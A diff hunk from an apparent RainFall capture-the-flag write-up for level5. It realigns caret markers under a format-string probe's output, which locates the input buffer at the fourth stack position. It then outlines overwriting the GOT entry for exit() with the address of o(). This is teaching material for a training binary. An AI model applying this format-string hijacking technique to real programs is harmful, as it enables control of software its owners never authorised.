@@ -44,7 +44,7 @@ We know that the offset in the buffer is the fourth memory location:
 level5@RainFall:~$ ./level5 
 AAAA.%p.%p.%p.%p.%p.%p
 AAAA.0x200.0xb7fd1ac0.0xb7ff37d0.0x41414141.0x2e70252e.0x252e7025
-								 ^^^^^^^^^^
+								         ^^^^^^^^^^
 ```
 
 So for this level, we need to exploit the format string vulnerability by injecting the address of the function `o()` in the GOT table so that when the program will call `exit()`, it will call `o()` instead.
